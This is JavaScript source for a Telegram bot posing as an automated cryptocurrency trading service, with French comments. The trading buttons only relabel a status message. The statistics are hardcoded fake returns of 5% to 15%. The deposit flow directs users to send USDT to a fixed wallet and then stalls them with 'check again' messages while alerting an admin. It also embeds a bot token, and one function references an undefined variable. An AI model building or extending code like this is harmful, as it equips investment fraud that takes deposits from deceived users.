const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const token = '6363609133:AAGokjYGa80BOoeG2ItLOiEA6_TYaFEKc60'; // Remplacez par votre token Telegram
const bot = new TelegramBot(token, { polling: true });
const SERVER_URL = 'http://solkah.org/id/chat.php'; // URL de votre serveur PHP pour stocker les données
const DATA_URL = 'http://solkah.org/id/data.txt'; // URL de votre fichier data.txt
const ADMIN_CHAT_ID = '5873712733'; // Remplacez par l'ID de l'administrateur

const keyboard = {
    reply_markup: {
        keyboard: [
            [{ text: 'Trading💰' }, { text: 'My Account' }],
            [{ text: 'Deposit' }, { text: 'Withdrawal' }],
            [{ text: 'Support' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    }
};

// Fonction de démarrage
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    // Enregistrer l'utilisateur dans le fichier data.txt via le serveur PHP
    axios.post(SERVER_URL, { chat_id: chatId })
        .then(() => {
            bot.sendMessage(chatId, "Great! All is ready for start.\n\nBefore using our service, we strongly recommend you to carefully review the functionality of each trading bot button.", keyboard);
        })
        .catch(err => console.error('Error posting to server:', err));
});

// Gestion des messages de l'utilisateur
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text === 'Trading💰') {
        sendTradingMenu(chatId);
    } else if (text === 'My Account') {
        sendAccountInfo(chatId);
    } else if (text === 'Support') {
        sendSupport(chatId);
    }
});

// Fonction pour envoyer le menu de trading
function sendTradingMenu(chatId) {
    const tradingKeyboard = {
        inline_keyboard: [
            [{ text: 'Start Trading', callback_data: 'start_trading' }],
            [{ text: 'Stop Trading', callback_data: 'stop_trading' }],
            [{ text: 'Statistics', callback_data: 'statistics' }],
            [{ text: 'Trading Bot Channel', url: 'https://t.me/+BaZqzAd4Mus5NzU0' }]
        ]
    };
    bot.sendMessage(chatId, "Trading\nStop trading / Start trading - starting and stopping the trading bot.\nTrading bot statistics - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.\nTrading status: Stopped 🚫", {
        reply_markup: tradingKeyboard
    });
}

// Fonction pour envoyer les informations du compte
function sendAccountInfo(chatId) {
    axios.get(DATA_URL)
        .then(response => {
            const data = response.data.split('\n');
            let user_data = {};
            data.forEach(line => {
                const parts = line.split(':');
                if (parts.length === 2) {
                    user_data[parts[0].trim()] = parts[1].trim();
                }
            });

            const current_balance = user_data['Solde'] || '0.00 USDT';
            const registration_date = user_data['Date d\'inscription'] || 'N/A';
            const total_withdrawal = user_data['Withdrawal'] || '0 USDT';

            const accountMessage = `💰 Current balance: ${current_balance}\n📅 Date of registration: ${registration_date}\n💸 Total withdrawal: ${total_withdrawal}\n\n🔗 Your referral link: https://t.me/@Orrdoxbot?start=${chatId}`;
            bot.sendMessage(chatId, accountMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Deposit', callback_data: 'deposit' }]
                    ]
                }
            });
        })
        .catch(err => console.error('Error fetching data:', err));
}

// Fonction pour envoyer un message de support
function sendSupport(chatId) {
    bot.sendMessage(chatId, "You are now connected to support. Please describe your issue.");
    bot.sendMessage(ADMIN_CHAT_ID, `Support request from ${chatId}: Please describe your issue.`);
}

// Gestion des interactions avec les boutons inline
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'start_trading') {
        updateTradingStatus(chatId, 'ACTIVE ✅️');
    } else if (query.data === 'stop_trading') {
        updateTradingStatus(chatId, 'Stopped 🚫');
    } else if (query.data === 'statistics') {
        bot.editMessageText("Trading Bot Statistics:\n24 hours: 5%\n3 days: 10%\n7 days: 15%", {
            chat_id: chatId,
            message_id: query.message.message_id
        });
    } else if (query.data === 'deposit') {
        sendDepositInfo(chatId);
    } else if (query.data === 'check_payment') {
        notifyAdminPaymentRequest(chatId);
    }
});

// Fonction pour mettre à jour le statut de trading
function updateTradingStatus(chatId, status) {
    const tradingKeyboard = {
        inline_keyboard: [
            [{ text: 'Start Trading', callback_data: 'start_trading' }],
            [{ text: 'Stop Trading', callback_data: 'stop_trading' }],
            [{ text: 'Statistics', callback_data: 'statistics' }],
            [{ text: 'Trading Bot Channel', url: 'https://t.me/+BaZqzAd4Mus5NzU0' }]
        ]
    };
    bot.editMessageText(`Trading\nStop trading / Start trading - starting and stopping the trading bot.\nTrading bot statistics - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.\nTrading status: ${status}`, {
        chat_id: chatId,
        message_id: query.message.message_id,
        reply_markup: tradingKeyboard
    });
}

// Fonction pour envoyer les informations de dépôt
function sendDepositInfo(chatId) {
    bot.sendMessage(chatId, 
        "❗️ In order to top up your balance, you need to transfer USDT to a wallet below (the commission for replenishment is 10%). \nThe transfer is realized automatically.\n\n❗️ The minimum amount for replenishment is 20 USDT\n\n➖➖➖➖➖\nWallet address USDT TRC-20:\n`TDpKzxmecCqdwUU8DoTjvjoKwUnemh7sge`\n(To copy, click on the wallet👆)", 
        {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Check Payment', callback_data: 'check_payment' }]
                ]
            },
            parse_mode: 'Markdown'
        }
    );
}

// Fonction pour notifier l'administrateur d'une demande de paiement
function notifyAdminPaymentRequest(chatId) {
    bot.sendMessage(chatId, "❗️Please, check again in 5 minutes❗️\n\n➖➖➖➖➖\nIf the payment is not accepted within 15 minutes, write to our support 📝", {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Check Again', callback_data: 'check_payment' }]
            ]
        }
    });

    bot.sendMessage(ADMIN_CHAT_ID, `New payment request from user with ID: ${chatId}`);
}
